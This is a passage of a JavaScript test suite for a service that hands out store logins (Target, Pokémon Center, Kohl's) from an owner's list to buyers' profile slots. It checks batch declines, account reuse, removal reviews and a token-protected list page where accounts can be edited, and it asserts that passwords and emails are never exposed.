    assert.equal((await admin("/admin/accounts/free", { email: "nobody@example.com" })).status, 200);   // sweeps
    assert.deepEqual(await held(tl), [["pokemoncenter", p.batch, 1], ["target", t.batch, 0]], "the reuse is kept");
    const t0 = await tStock();
    assert.match(await (await approvePost(t.link, "decline")).text(), /1 Target account stays with them/);
    assert.deepEqual(await tStock(), t0, "the Target account isn't put back");
    // The owner frees them by hand.
    assert.equal((await admin("/admin/accounts/free", { email: tl })).status, 200);
    assert.deepEqual(await held(tl), []);
    assert.deepEqual(await tStock(), { ...t0, free: t0.free + 1, sent: t0.sent - 1 });
  });
  await test("the same email on the Pokémon Center list: declining the Target batch keeps it, declining the other puts both back", async () => {
    // Quinn holds keep1 and keep2, so the Target slot below gets both1, the one free Target account.
    const hold = await sendBatch([tgFile(["Quinn X1", "Quinn X2"])], [{ name: "Target", n: 2, seller: 2 }]);
    await offerAdd(owenKey, "target", "Target", [{ email: "both1@outlook.com", password: "Tgt-Pw-5!" }]);
    await offerAdd(owenKey, "pokemoncenter", "Pokémon Center", [{ email: "both1@outlook.com", password: "Inbox-Pw-5!" }]);
    const t = await sendBatch([tgFile(["Quinn W"])], TG1);
    assert.equal(t.emails[0][0], "both1@outlook.com");
    const p = await sendBatch([pcFile(["Quinn W"])], PC1);
    assert.equal(p.emails[0][0], "both1@outlook.com");
    assert.deepEqual(await held("both1@outlook.com"), [["pokemoncenter", p.batch, 0], ["target", t.batch, 0]], "the Pokémon Center list's own account");
    const t0 = await tStock(), p0 = await pcStock();
    assert.match(await (await approvePost(t.link, "decline")).text(), /1 Target account stays with them/);
    assert.deepEqual(await tStock(), t0);
    assert.match(await (await approvePost(p.link, "decline")).text(), /2 accounts given to them are back on your list\./);
    assert.deepEqual(await held("both1@outlook.com"), []);
    assert.deepEqual(await tStock(), { ...t0, free: t0.free + 1, sent: t0.sent - 1 });
    assert.deepEqual(await pcStock(), { ...p0, free: p0.free + 1, sent: p0.sent - 1 });
    assert.match(await (await approvePost(hold.link, "decline")).text(), /2 accounts given to them are back on your list\./);
    // Off both lists again, as the tests after these expect them.
    assert.equal((await admin("/admin/accounts/remove", { email: "both1@outlook.com" })).status, 200);
    // Owen's go back for the tests after these.
    assert.match(await (await approvePost(fillLink, "decline")).text(), /back on your list\./);
  });
  console.log("\nA profile sent again gets back the account it had (app 1.9.99+, 2026-10-07)");
  // Ivan is the buyer here (sign-ins are rate limited), with the owner's accounts for a store of their own (Kohl's), so
  // the counts are exact. The app says which of its slots are still out on each store (`active`).
  let ritaKey, rA, rB, rC, b1, b2, b1Link;
  const kFile = (names) => ({ store: "Kohl's", storeKey: "kohls", kind: "profiles", text: slotCsv(names.map((n) => slotRow(n, ""))), assigned: names.length });
  const ritaSend = async (names, active, batch = "back" + rid()) => {
    const before = webhookPosts.length;
    const r = await slots("/submissions", ritaKey, { files: [kFile(names)], name: "Rita", slots: names.length, batch,
      stores: [{ name: "Kohl's", n: names.length, seller: names.length }], ...(active ? { active } : {}) });
    const d = await r.json(), m = r.ok ? batchPost(before) : null;
    return { status: r.status, d, m, batch, emails: m ? emailsOf(aycdOf(m)[0]) : [], logins: m && plain(m)[0] ? plain(m)[0].text.split("\r\n") : [] };
  };
  const ritaHeld = async () => (await accounts()).given.filter((a) => a.key_last4 === ritaKey.slice(-4) && a.store === "kohls").map((a) => [a.email, a.profile, a.batch]).sort();
  const kStock = async () => (await accounts()).stores.find((x) => x.store === "kohls");
  await test("setup: three of the owner's Kohl's accounts", async () => {
    ritaKey = ivanKey;
    assert.deepEqual(await ritaHeld(), []);
    // Offered from Hana's license (offers are limited per license a day, and Ivan has sent his).
    await offerAdd(hanaKey, "kohls", "Kohl's", [1, 2, 3].map((i) => ({ email: `kohls${i}@outlook.com`, password: "Kohls-Pw-1!" })));
    assert.ok((await accounts()).given.filter((a) => a.key_last4 === ritaKey.slice(-4)).length <= 7, "room under the limit for these");
    assert.deepEqual(await kStock(), { store: "kohls", total: 3, free: 3, sent: 0 });
  });
  await test("the first time, each slot gets an account", async () => {
    const s = await ritaSend(["Rita A", "Rita B"], { kohls: [] });
    assert.deepEqual(s.d.accounts, { "Kohl's": { asked: 2, got: 2 } });
    assert.match(s.m.content, /\nKohl's 2 \(2 assigned accounts\)\n/);
    [rA, rB] = s.emails; b1 = s.batch; b1Link = approveLink(s.m.content);
    assert.ok(/^kohls[123]@outlook\.com$/.test(rA) && /^kohls[123]@outlook\.com$/.test(rB) && rA !== rB, s.emails);
    assert.deepEqual(await ritaHeld(), [[rA, "Rita A", b1], [rB, "Rita B", b1]].sort());
  });
  await test("sent again after its slot was switched off, a profile gets back the account it had, and the line says so", async () => {
    const s = await ritaSend(["Rita A"], { kohls: ["Rita B"] });
    assert.deepEqual(s.d.accounts, { "Kohl's": { asked: 1, got: 1 } }, "what the app hears is as before");
    assert.equal(s.emails[0], rA); assert.deepEqual(s.logins, [`${rA}:Kohls-Pw-1!`], "in its logins file too");
    assert.match(s.m.content, /\nKohl's 1 \(1 assigned account, 1 they had before\)\n/);
    b2 = s.batch;
    assert.deepEqual(await ritaHeld(), [[rA, "Rita A", b2], [rB, "Rita B", b1]].sort(), "moved to the new batch: no new account");
    assert.deepEqual(await kStock(), { store: "kohls", total: 3, free: 1, sent: 2 });
  });
  await test("a profile whose slot is still out (or another with its name) gets a new account, never that one", async () => {
    const s = await ritaSend(["Rita B"], { kohls: ["Rita A", "Rita B"] });
    rC = s.emails[0];
    assert.ok(/^kohls[123]@outlook\.com$/.test(rC) && rC !== rA && rC !== rB, s.emails);
    assert.match(s.m.content, /\nKohl's 1 \(1 assigned account\)\n/);
    assert.deepEqual(await kStock(), { store: "kohls", total: 3, free: 0, sent: 3 });
  });
  await test("an app before 1.9.99 doesn't say which slots are out: a new account, as before (none left here, and the line says so)", async () => {
    const s = await ritaSend(["Rita A"], null);
    assert.deepEqual(s.d.accounts, { "Kohl's": { asked: 1, got: 0 } });
    assert.match(s.m.content, /\nKohl's 1 \(1 needs an account: your list has none\)\n/);
    assert.equal(s.emails[0], ""); assert.deepEqual(s.logins, []);
    assert.deepEqual((await ritaHeld()).map((x) => x[0]).sort(), [rA, rB, rC].sort(), "rA stays where it was");
  });
  await test("a given-back account goes back to the batch it came from if the new one never posts", async () => {
    const batch = "back" + rid();
    webhookFail.push(500);
    assert.equal((await ritaSend(["Rita A"], { kohls: [] }, batch)).status, 502);
    assert.deepEqual((await ritaHeld()).find((x) => x[0] === rA), [rA, "Rita A", b2], "back in the batch it came from");
    const s = await ritaSend(["Rita A"], { kohls: [] }, batch);
    assert.equal(s.status, 200); assert.equal(s.emails[0], rA);
    assert.deepEqual((await ritaHeld()).find((x) => x[0] === rA), [rA, "Rita A", batch]);
  });
  await test("declining the batch an account was given back from leaves it with the batch that has it now", async () => {
    assert.match(await (await approvePost(b1Link, "decline")).text(), /1 account given to them is back on your list\./);
    assert.deepEqual((await ritaHeld()).map((x) => x[0]).sort(), [rA, rC].sort(), "Rita B's goes back; Rita A's, given back since, stays");
    assert.deepEqual(await kStock(), { store: "kohls", total: 3, free: 1, sent: 2 });
    // Off the list again, as the tests after these expect it.
    for (const i of [1, 2, 3]) assert.equal((await admin("/admin/accounts/remove", { email: `kohls${i}@outlook.com` })).status, 200);
    assert.equal(await kStock(), undefined);
  });
  console.log("\nTaking accounts off the list from FAFO (app 1.9.90+)");
  const removalLink = (content) => (content.match(/\((http[^)]+\/accounts\/removal\/[^)]+)\)/) || [])[1];
  const removalPost = (link, action) => fetch(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), action }) });
  const askRemove = async (emails) => {
    const r = await slots("/accounts/remove", ivanKey, { emails, name: "Owner" });
    await new Promise((ok) => setTimeout(ok, 400));
    return { r, status: r.status, body: await r.json(), m: webhookPosts.at(-1) };
  };
  const stock = async (store) => (await accounts()).stores.find((x) => x.store === store) || { total: 0, free: 0, sent: 0 };
  await test("asking to remove needs a license and emails", async () => {
    assert.equal((await slots("/accounts/remove", null, { emails: ["pc1@outlook.com"] })).status, 401);
    for (const body of [{}, { emails: [] }, { emails: "pc1@outlook.com" }, { emails: ["nope"] }, { emails: ["pc1@outlook.com", "x:y@outlook.com"] }])
      assert.equal((await slots("/accounts/remove", ivanKey, body)).status, 400, JSON.stringify(body));
  });
  let rmLink, gone, both, gOnTarget;
  await test("asking posts the count and a review link, never the emails; the page shows where each one is", async () => {
    // Hana gets a Pokémon Center account, so one of those asked about has been given out.
    const before = webhookPosts.length;
    await slots("/submissions", hanaKey, { files: [pcFile(["Hana Z"])], name: "Hana", slots: 1, batch: "rmv1" + rid(), stores: [{ name: "Pokémon Center", n: 1, seller: 1 }] });
    assert.ok(batchPost(before));
    const g = (await accounts()).given.find((a) => a.profile === "Hana Z");
    assert.ok(g && g.store === "pokemoncenter", "Hana Z got one");
    gone = g.email.toLowerCase();
    // An email on both the Target and the Pokémon Center list.
    both = ["lia.tgt@outlook.com", tA.toLowerCase()].find((e) => e !== gone);
    gOnTarget = ["lia.tgt@outlook.com", tA.toLowerCase()].includes(gone);
    const { status, body, m } = await askRemove([g.email.toUpperCase(), both, "nobody@example.com", both]);
    assert.equal(status, 200); assert.deepEqual(body, { status: "pending", count: 3 }, "each email counts once, whatever its case");
    assert.match(m.content, /^🗑️ \*\*Take 3 accounts off your list for Use Assigned Account\?\*\*\nAsked by \*\*Owner\*\* · @ivan · license …/);
    assert.ok(![gone, both, "nobody@example.com"].some((e) => m.content.toLowerCase().includes(e)), "no emails in the channel");
    rmLink = removalLink(m.content); assert.ok(rmLink, m.content);
    const html = await (await fetch(rmLink)).text();
    assert.match(html, /3 accounts to take off your list for Use Assigned Account/); assert.match(html, /Only remove these if you asked/);
    assert.ok(html.includes(`<strong>${gone}</strong>: `) && html.includes(`Pokémon Center: given to license …${hanaKey.slice(-4)} for Hana Z`), "the one given out says to whom");
    assert.ok(html.includes(`<strong>${both}</strong>: Pokémon Center: free; Target: free`), "one on both lists shows both");
    assert.ok(html.includes("<strong>nobody@example.com</strong>: not on your list"));
    assert.match(html, /One given to a buyer's slot stops reporting its orders to them once it's removed\./);
    assert.doesNotMatch(html, /Pw-|Inbox-Pw|Tgt-Pw/, "never a password");
    assert.equal((await fetch(rmLink.replace(/t=[^&]+/, "t=wrong"))).status, 404);
  });
  await test("Keep removes nothing", async () => {
    const pc = await stock("pokemoncenter");
    const { m } = await askRemove(["pc3@outlook.com"]);
    const link = removalLink(m.content);
    assert.match(await (await removalPost(link, "keep")).text(), /Kept\. Nothing was removed\./);
    assert.match(await (await removalPost(link, "remove")).text(), /Kept\. Nothing was removed\./, "decided: stays kept");
    assert.deepEqual(await stock("pokemoncenter"), pc);
    await new Promise((ok) => setTimeout(ok, 300));
    assert.match(webhookEdits.at(-1).content, /^↩️ \*\*Kept 1 account\*\* on your list\nAsked by/); assert.doesNotMatch(webhookEdits.at(-1).content, /Review/);
  });
  await test("Remove takes each off every store's list it's on, given out or not", async () => {
    const pc = await stock("pokemoncenter"), tg = await stock("target");
    assert.match(await (await removalPost(rmLink, "remove")).text(), /Took 2 off your list\. 1 wasn&#39;t on it\./);
    assert.deepEqual(await stock("pokemoncenter"), { store: "pokemoncenter", total: pc.total - 2, free: pc.free - 1, sent: pc.sent - 1 });
    assert.equal((await stock("target")).total, tg.total - 1 - (gOnTarget ? 1 : 0));
    assert.ok(!(await accounts()).given.some((a) => a.profile === "Hana Z"), "Hana Z's is gone");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.match(webhookEdits.at(-1).content, /^🗑️ \*\*Took 2 accounts off your list\*\* for Use Assigned Account/);
    const again = await (await fetch(rmLink)).text();
    assert.match(again, /Took 2 off your list/); assert.doesNotMatch(again, new RegExp(both.replace(/\./g, "\\.")), "once decided, the page no longer lists them");
    const d = await accounts();
    assert.deepEqual(d.removals.slice(0, 2).map((x) => [x.status, x.count, x.removed]), [["kept", 1, null], ["removed", 3, 2]]);
    assert.ok(d.removals.every((x) => /\/accounts\/removal\//.test(x.review_url) && x.emails === undefined), "the admin list has links, never the emails");
  });
  await test("an ask nobody decided on expires, and its emails are dropped", async () => {
    const pc = await stock("pokemoncenter");
    const { m } = await askRemove(["pc1@outlook.com"]);
    const link = removalLink(m.content);
    await new Promise((ok) => setTimeout(ok, 8200));   // ACCOUNT_OFFER_TTL_MS is 8000 here
    const html = await (await removalPost(link, "remove")).text();
    assert.match(html, /Expired before you decided/); assert.doesNotMatch(html, /pc1@outlook\.com/);
    assert.deepEqual(await stock("pokemoncenter"), pc, "nothing removed");
  });

  console.log("\nSee my list (app 1.9.102+)");
  const dbRows = (cmd) => JSON.parse(execFileSync(process.execPath, [...wrangler, "d1", "execute", "orbit-license", "--local", "--persist-to", join(tmp, "approval"), "--command", cmd, "--json"], { cwd: root, env, stdio: "pipe" }).toString())[0].results;
  const listLink = (content) => (content.match(/\((http[^)]+\/accounts\/list\/[^)]+)\)/) || [])[1];
  // wrangler dev closes a connection left idle while a test reads the database (dbRows takes a few seconds), and fetch
  // can reuse it just as it closes: tried once more then, as the request never reached the worker.
  const fetchOnce = async (url, opts) => { try { return await fetch(url, opts); } catch (e) { if (e.cause && e.cause.code === "UND_ERR_SOCKET") return fetch(url, opts); throw e; } };
  const listStatus = async (url, opts) => { const r = await fetchOnce(url, opts); await r.text(); return r.status; };
  // Each body is read, so the connection is free for the next request.
  const view = async (link, q) => { const r = await fetchOnce(`${link}&${new URLSearchParams(q)}`); const body = await r.text(); return { status: r.status, text: async () => body }; };
  // A change sent without following its redirect: the 303 back to the list, and where it points.
  const sendRaw = async (link, body) => { const r = await fetchOnce(link.split("?")[0], { method: "POST", redirect: "manual", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), ...body }) }); await r.text(); return { status: r.status, location: r.headers.get("location") || "" }; };
  const send = async (link, body) => { const r = await listPost(link, body); const text = await r.text(); return { status: r.status, text: async () => text }; };
  const page2 = async (r) => unescape(await r.text());
  const listPost = (link, body) => fetchOnce(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), ...body }) });
  const askList = async (key = ivanKey) => { const r = await slots("/accounts/list", key, { name: "Owner" }); return { status: r.status, body: await r.json(), m: webhookPosts.at(-1) }; };
  const unescape = (h) => h.replace(/&#39;/g, "'").replace(/&quot;/g, '"').replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
  const sqlRun = (cmd) => execFileSync(process.execPath, [...wrangler, "d1", "execute", "orbit-license", "--local", "--persist-to", join(tmp, "approval"), "--command", cmd], { cwd: root, env, stdio: "pipe" });
  // A buyer's Pokémon Center slot that got their Target account again, as reuseAccount keeps it (made if there's none).
  const ensureReuse = () => {
    const rows = dbRows("SELECT store, email_norm, key_hash, batch, offer_id FROM accounts");
    if (rows.some((x) => x.offer_id === "reuse:target" && x.key_hash && rows.some((t) => t.store === "target" && t.key_hash === x.key_hash && t.email_norm === x.email_norm))) return;
    const t = rows.find((x) => x.store === "target" && x.key_hash && !x.batch.startsWith("parked:") && !rows.some((p) => p.store === "pokemoncenter" && p.email_norm === x.email_norm));
    sqlRun(`INSERT INTO accounts (store, email, email_norm, password, added_at, offer_id, key_hash, key_last4, batch, store_name, profile, assigned_at, sent_at)
      SELECT 'pokemoncenter', email, email_norm, password, added_at, 'reuse:target', key_hash, key_last4, batch, 'Pokémon Center', profile, assigned_at, sent_at
      FROM accounts WHERE store = 'target' AND email_norm = '${t.email_norm}'`);
  };
  let lsLink;
  await test("asking for the list needs a license; it posts a link to the channel, never an email", async () => {
    assert.equal((await slots("/accounts/list", null, {})).status, 401);
    const before = webhookPosts.length;
    const { status, body, m } = await askList();
    assert.equal(status, 200); assert.deepEqual(body, { status: "sent" });
    assert.equal(webhookPosts.length, before + 1);
    assert.match(m.content, /^📋 \*\*Your list for Use Assigned Account\*\*\nAsked by \*\*Owner\*\* · @ivan · license …\w{4}\n\[See or edit the list\]\(http[^)]+\/accounts\/list\/[A-Za-z0-9_-]+\?t=[A-Za-z0-9_-]+\) · the link works for 24 hours$/, m.content);
    assert.doesNotMatch(m.content, /@outlook\.com|@example\.com/, "no account in the channel");
    lsLink = listLink(m.content); assert.ok(lsLink);
  });
  await test("the page lists every account on every store's list, free or given and to whom, never a password", async () => {
    ensureReuse();
    const rows = dbRows("SELECT store, email, key_hash, key_last4, profile, batch, offer_id, sent_at, password FROM accounts");
    assert.ok(rows.length > 5 && rows.some((a) => !a.key_hash) && rows.some((a) => a.key_hash && a.sent_at), "a list with free and given accounts to show");
    const r = await fetchOnce(lsLink), html = await r.text(), text = unescape(html);
    assert.equal(r.status, 200); assert.equal(r.headers.get("cache-control"), "no-store");
    for (const a of rows) assert.ok(text.includes(`<td class="em">${a.email}</td>`), "listed: " + a.email);
    for (const a of rows.filter((x) => x.password)) assert.ok(!text.includes(a.password), "never a password");
    const own = rows.filter((a) => !String(a.offer_id || "").startsWith("reuse:"));
    assert.ok(text.includes(`<p class="who">${own.length} accounts, ${own.filter((a) => !a.key_hash).length} free</p>`), "the total and how many are free");
    for (const st of new Set(rows.map((a) => a.store))) {
      const mine = own.filter((a) => a.store === st), name = { target: "Target", pokemoncenter: "Pokémon Center" }[st] || st;
      assert.ok(text.includes(`<h3>${name} <span class="count">${mine.filter((a) => !a.key_hash).length} free of ${mine.length}</span></h3>`), "each store's count: " + st);
    }
    const given = rows.find((a) => a.key_hash && a.sent_at && !String(a.batch || "").startsWith("parked:") && !String(a.offer_id || "").startsWith("reuse:"));
    assert.ok(text.includes(`Given to license …${given.key_last4}${given.profile ? `, ${given.profile}` : ""}, sent `), "a given account says to whom");
    const reused = rows.find((a) => String(a.offer_id || "").startsWith("reuse:") && a.key_hash);
    assert.ok(text.includes(`Reused from Target for license …${reused.key_last4}${reused.profile ? `, ${reused.profile}` : ""}`), "a reuse says so");
    // One held for a Pokémon Center slot (parked), and one whose batch is still being sent: shown so, then put back.
    const [held, sending] = rows.filter((a) => a.store === "target" && a.key_hash && a.sent_at && !String(a.batch).startsWith("parked:") && a.email !== reused.email);
    assert.ok(held && sending, "two more given Target accounts");
    const hn = held.email.toLowerCase(), sn = sending.email.toLowerCase();
    sqlRun(`UPDATE accounts SET batch = 'parked:' || batch WHERE store = 'target' AND email_norm = '${hn}'; UPDATE accounts SET sent_at = NULL WHERE store = 'target' AND email_norm = '${sn}'`);
    try {
      const t2 = unescape(await (await fetchOnce(lsLink)).text());
      assert.ok(t2.includes(`Held for license …${held.key_last4}${held.profile ? `, ${held.profile}` : ""}: its Pokémon Center slot still uses it`), "a held one says so");
      assert.ok(t2.includes(`Given to license …${sending.key_last4}${sending.profile ? `, ${sending.profile}` : ""}, in a batch being sent`), "one in a batch being sent says so");
    } finally {
      sqlRun(`UPDATE accounts SET batch = substr(batch, 8) WHERE store = 'target' AND email_norm = '${hn}' AND batch LIKE 'parked:%'; UPDATE accounts SET sent_at = ${sending.sent_at} WHERE store = 'target' AND email_norm = '${sn}'`);
    }
    assert.equal((await listStatus(lsLink.replace(/t=[^&]+/, "t=wrong"))), 404, "a wrong token");
    assert.equal((await listStatus(lsLink.replace(/\/accounts\/list\/[^?]+/, "/accounts/list/nope1234"))), 404, "a wrong id");
  });
  await test("Remove asks first, then takes the email off every store's list, and the page says so", async () => {
    const rows = dbRows("SELECT store, email, email_norm, key_hash FROM accounts");
    const counts = new Map(); rows.forEach((a) => counts.set(a.email_norm, (counts.get(a.email_norm) || 0) + 1));
    const target = rows.find((a) => counts.get(a.email_norm) > 1);
    assert.ok(target, "an email on two stores' lists");
    const ask = await (await listPost(lsLink, { action: "ask", email: target.email.toUpperCase() })).text();
    assert.match(unescape(ask), /<h2>Remove an account<\/h2>/); assert.ok(unescape(ask).includes(target.email), "names it");
    assert.match(unescape(ask), /It comes off every store's list it's on, so no more slots get it\./);
    assert.match(ask, /value="remove">Remove from my list<\/button>/); assert.match(ask, />Keep it<\/button>/);
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM accounts WHERE email_norm = '${target.email_norm}'`)[0].n, counts.get(target.email_norm), "asking removes nothing");
    await view(lsLink, { action: "remove", email: target.email });
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM accounts WHERE email_norm = '${target.email_norm}'`)[0].n, counts.get(target.email_norm), "a link (GET) removes nothing");
    const rm = await sendRaw(lsLink, { action: "remove", email: target.email });
    assert.equal(rm.status, 303); assert.match(rm.location, /\?t=[^&]+&done=Took\+/, "back to the list by its link");
    const done = unescape(await (await fetchOnce(new URL(rm.location, lsLink))).text());
    assert.ok(done.includes(`<p>Took ${target.email} off your list.</p>`), "the page says it");
    assert.ok(!done.includes(`<td class="em">${target.email}</td>`), "and no longer lists it");
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM accounts WHERE email_norm = '${target.email_norm}'`)[0].n, 0, "off every store's list");
    const again = unescape(await (await listPost(lsLink, { action: "remove", email: target.email })).text());
    assert.ok(again.includes(`<p>${target.email.toLowerCase()} isn't on your list any more.</p>`), "removing it twice changes nothing");
    const wrong = await listPost(lsLink.replace(/t=[^&]+/, "t=wrong"), { action: "remove", email: rows[0].email });
    await wrong.text(); assert.equal(wrong.status, 404, "never without the token");
  });
  await test("Edit changes a free account's password, and never shows one", async () => {
    const rows = dbRows("SELECT store, email, email_norm, password, key_hash, offer_id FROM accounts");
    const a = rows.find((x) => !x.key_hash && x.store === "target");
    const ed = await view(lsLink, { action: "edit", store: a.store, email: a.email_norm });
    const html = await page2(ed);
    assert.equal(ed.status, 200); assert.match(html, /<h2>Edit an account<\/h2>/);
    assert.ok(html.includes(`name="new_email" value="${a.email}"`), "its email, to change");
    assert.doesNotMatch(html, /name="new_email"[^>]*readonly/, "a free one's email can change");
    assert.doesNotMatch(html, /Give it back/, "nothing to give back");
    for (const x of rows) assert.ok(!html.includes(x.password), "never a password");
    const done = await page2(await send(lsLink, { action: "save", store: a.store, email: a.email_norm, new_email: a.email, password: " Fresh-pass-1 " }));
    assert.ok(done.includes(`<p>Changed the password of ${a.email} on your Target list.</p>`), done.slice(0, 600));
    assert.ok(!done.includes("Fresh-pass-1"), "and doesn't show it");
    const b = dbRows(`SELECT email, password, key_hash FROM accounts WHERE store = 'target' AND email_norm = '${a.email_norm}'`)[0];
    assert.equal(b.password, "Fresh-pass-1"); assert.equal(b.email, a.email); assert.equal(b.key_hash, null);
    const raw = await fetchOnce(lsLink.split("?")[0], { method: "POST", redirect: "manual", body: new URLSearchParams({ t: new URL(lsLink).searchParams.get("t"), action: "save", store: a.store, email: a.email_norm, new_email: a.email, password: "" }) });
    await raw.text();
    assert.equal(raw.status, 303, "a change goes back to the list by its link, so reloading doesn't send it again");
    assert.match(raw.headers.get("location"), /^\/accounts\/list\/[^?]+\?t=[^&]+&done=Nothing\+changed\.$/);
    const nl = await page2(await send(lsLink, { action: "save", store: a.store, email: a.email_norm, new_email: a.email, password: "two\nlines" }));
    assert.ok(nl.includes(`<p class="err">That password can't have a line break.</p>`), "a password with a line break would split the logins file");
    const same = await page2(await send(lsLink, { action: "save", store: a.store, email: a.email_norm, new_email: a.email, password: "" }));
    assert.ok(same.includes("<p>Nothing changed.</p>"), "an empty password keeps it");
    assert.equal(dbRows(`SELECT password FROM accounts WHERE store = 'target' AND email_norm = '${a.email_norm}'`)[0].password, "Fresh-pass-1");
    const viaGet = await view(lsLink, { action: "save", store: a.store, email: a.email_norm, new_email: a.email, password: "by-get" });
    assert.equal(viaGet.status, 200);
    assert.equal(dbRows(`SELECT password FROM accounts WHERE store = 'target' AND email_norm = '${a.email_norm}'`)[0].password, "Fresh-pass-1", "a link (GET) never changes anything");
    assert.equal((await send(lsLink.replace(/t=[^&]+/, "t=wrong"), { action: "save", store: a.store, email: a.email_norm, new_email: a.email, password: "x" })).status, 404);
  });
  await test("a free account's email can change; one already on that list, or not an email, is refused", async () => {
    const all = dbRows("SELECT store, email, email_norm, key_hash FROM accounts"), rows = all.filter((x) => x.store === "target");
    // A free Target account on no other store's list, so its old email is gone from the page once it changes.
    const [a, other] = [rows.find((x) => !x.key_hash && !all.some((y) => y.store !== "target" && y.email_norm === x.email_norm)), rows.find((x) => x.key_hash)];
    assert.ok(a && other, "a free Target account and a given one");
    const dup = await page2(await send(lsLink, { action: "save", store: "target", email: a.email_norm, new_email: other.email.toUpperCase(), password: "" }));
    assert.ok(dup.includes(`<p class="err">${other.email.toUpperCase()} is already on your Target list.</p>`), dup.slice(0, 600));
    const bad = await page2(await send(lsLink, { action: "save", store: "target", email: a.email_norm, new_email: "not an email", password: "" }));
    assert.ok(bad.includes(`<p class="err">That isn't an email address.</p>`));
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM accounts WHERE store = 'target' AND email_norm = '${a.email_norm}'`)[0].n, 1, "unchanged");
    const done = await page2(await send(lsLink, { action: "save", store: "target", email: a.email_norm, new_email: "Fixed.Name@example.com", password: "new-pw-2" }));
    assert.ok(done.includes(`<p>Changed ${a.email} to Fixed.Name@example.com, with its new password, on your Target list.</p>`), done.slice(0, 600));
    assert.ok(done.includes(`<td class="em">Fixed.Name@example.com</td>`) && !done.includes(`<td class="em">${a.email}</td>`), "listed under its new email");
    const b = dbRows("SELECT email, password, key_hash FROM accounts WHERE store = 'target' AND email_norm = 'fixed.name@example.com'")[0];
    assert.deepEqual(b, { email: "Fixed.Name@example.com", password: "new-pw-2", key_hash: null });
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM accounts WHERE email_norm = '${a.email_norm}' AND store = 'target'`)[0].n, 0, "the old email is gone");
  });
  await test("a given account keeps its email and gets a new password (its reuse too), and can be given back to the list", async () => {
    ensureReuse();
    const rows = dbRows("SELECT store, email, email_norm, password, key_hash, key_last4, batch, offer_id FROM accounts");
    const reuses = rows.filter((x) => x.offer_id === "reuse:target" && x.key_hash);
    const a = rows.find((x) => x.store === "target" && x.key_hash && reuses.some((r) => r.email_norm === x.email_norm && r.key_hash === x.key_hash))
      || rows.find((x) => x.store === "target" && x.key_hash);
    const reused = reuses.filter((r) => r.email_norm === a.email_norm && r.key_hash === a.key_hash);
    assert.ok(reused.length, "a Target account whose reuse at Pokémon Center goes with it");
    const html = await page2(await view(lsLink, { action: "edit", store: "target", email: a.email_norm }));
    assert.match(html, /name="new_email"[^>]*readonly/, "its email can't change");
    assert.ok(html.includes("Give it back to my list") && html.includes(`License …${a.key_last4} keeps what was posted to your channel, and stops getting order alerts for it.`), html.slice(0, 900));
    assert.ok(html.includes("Their Pokémon Center slot that uses it again loses it too."), "says its reuse goes too");
    const ru = await page2(await view(lsLink, { action: "edit", store: "pokemoncenter", email: a.email_norm }));
    assert.ok(ru.includes("It's your Target account, used again for this buyer's Pokémon Center slot, so it follows that one: change it on your Target list.") && !ru.includes('name="password"'), "the reuse itself is changed through its Target account");
    const forgedReuse = await page2(await send(lsLink, { action: "save", store: "pokemoncenter", email: a.email_norm, new_email: a.email, password: "sneaky" }));
    assert.ok(forgedReuse.includes("It follows your Target account: change that one."));
    assert.notEqual(dbRows(`SELECT password FROM accounts WHERE store = 'pokemoncenter' AND email_norm = '${a.email_norm}'`)[0].password, "sneaky");
    const forged = await page2(await send(lsLink, { action: "save", store: "target", email: a.email_norm, new_email: "someone.else@example.com", password: "" }));
    assert.ok(forged.includes("<p class=\"err\">It's on a buyer's slot, so its email can't change. Give it back to your list first.</p>"));
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts WHERE email_norm = 'someone.else@example.com'")[0].n, 0);
    await send(lsLink, { action: "save", store: "target", email: a.email_norm, new_email: a.email, password: "given-pw-3" });
    assert.equal(dbRows(`SELECT password FROM accounts WHERE store = 'target' AND email_norm = '${a.email_norm}'`)[0].password, "given-pw-3");
    for (const r of reused) assert.equal(dbRows(`SELECT password FROM accounts WHERE store = '${r.store}' AND email_norm = '${r.email_norm}'`)[0].password, "given-pw-3", "its reuse checks out with the new one too");
    assert.equal(dbRows(`SELECT key_hash FROM accounts WHERE store = 'target' AND email_norm = '${a.email_norm}'`)[0].key_hash, a.key_hash, "still the buyer's");
    await view(lsLink, { action: "giveback", store: "target", email: a.email_norm });
    assert.equal(dbRows(`SELECT key_hash FROM accounts WHERE store = 'target' AND email_norm = '${a.email_norm}'`)[0].key_hash, a.key_hash, "a link (GET) gives nothing back");
    const gb = await sendRaw(lsLink, { action: "giveback", store: "target", email: a.email_norm });
    assert.equal(gb.status, 303); assert.match(gb.location, /\?t=[^&]+&done=Gave\+/, "back to the list, saying so");
    const done = await page2(await view(lsLink, Object.fromEntries(new URLSearchParams(gb.location.split("?")[1]).entries())));
    assert.ok(done.includes(`<p>Gave ${a.email} back to your Target list. It's free for the next slot.</p>`), done.slice(0, 600));
    const b = dbRows(`SELECT key_hash, batch, profile, password FROM accounts WHERE store = 'target' AND email_norm = '${a.email_norm}'`)[0];
    assert.deepEqual(b, { key_hash: null, batch: null, profile: null, password: "given-pw-3" }, "free, with its password");
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM accounts WHERE email_norm = '${a.email_norm}' AND offer_id = 'reuse:target'`)[0].n, 0, "its reuse is dropped");
    const again = await page2(await send(lsLink, { action: "giveback", store: "target", email: a.email_norm }));
    assert.ok(again.includes(`<p>${a.email} is already free on your Target list.</p>`));
    {
      const r = await page2(await view(lsLink, { action: "edit", store: reused[0].store, email: reused[0].email_norm }));
      assert.ok(r.includes(`isn't on your Pokémon Center list any more.`), "the reuse's own link says it's gone");
    }
  });
  await test("Add puts accounts on a store's list, says which lines it couldn't read, and never changes one already there", async () => {
    const pc = dbRows("SELECT email, email_norm, password FROM accounts WHERE store = 'pokemoncenter' AND COALESCE(offer_id, '') NOT LIKE 'reuse:%'")[0];
    const before = dbRows("SELECT COUNT(*) AS n FROM accounts")[0].n;
